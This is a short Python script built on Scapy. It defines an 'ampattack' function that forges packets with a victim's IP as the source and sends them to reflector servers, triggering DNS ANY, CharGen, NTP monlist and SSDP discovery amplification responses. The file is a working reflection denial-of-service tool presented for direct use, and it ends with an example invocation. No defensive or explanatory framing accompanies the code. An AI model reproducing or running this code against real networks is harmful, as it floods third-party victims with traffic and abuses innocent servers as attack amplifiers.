import scapy.all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
import random

def ampattack(reflector, victim=None, service="DNS", port=None):
    if victim is None:
        victim = scapy.get_if_addr(scapy.conf.iface)  # Fallback: send response to ourself (for debugging)

    match service:
        case "DNS":
            port = port or 53
            pkt = IP(src=victim, dst=reflector) / UDP(sport=random.randint(1024, 65535), dport=port) / \
                  DNS(rd=1, qd=DNSQR(qname="ANY", qtype="ANY"))
            print(f"[+] Sending DNS amplification packet to {reflector}, spoofed from {victim}")
            scapy.send(pkt, verbose=0)

        case "UDP CharGen":
            port = port or 19
            pkt = IP(src=victim, dst=reflector) / UDP(sport=random.randint(1024, 65535), dport=port)
            print(f"[+] Sending CharGen amplification packet to {reflector}, spoofed from {victim}")
            scapy.send(pkt, verbose=0)

        case "NTP":
            port = port or 123
            data = b'\x17\x00\x03\x2a' + b'\x00' * 4  # 'monlist' request for older NTP servers
            pkt = IP(src=victim, dst=reflector) / UDP(sport=random.randint(1024, 65535), dport=port) / data
            print(f"[+] Sending NTP amplification packet to {reflector}, spoofed from {victim}")
            scapy.send(pkt, verbose=0)

        case "SSDP":
            port = port or 1900
            payload = (
                'M-SEARCH * HTTP/1.1\r\n'
                f'HOST: {reflector}:{port}\r\n'
                'MAN: "ssdp:discover"\r\n'
                'MX: 1\r\n'
                'ST: ssdp:all\r\n\r\n'
            )
            pkt = IP(src=victim, dst=reflector) / UDP(sport=random.randint(1024, 65535), dport=port) / payload
            print(f"[+] Sending SSDP amplification packet to {reflector}, spoofed from {victim}")
            scapy.send(pkt, verbose=0)

        case _:
            raise ValueError(f"Unsupported service: {service}")

# Example: ampattack("192.168.1.100", victim="192.168.1.50", service="NTP")
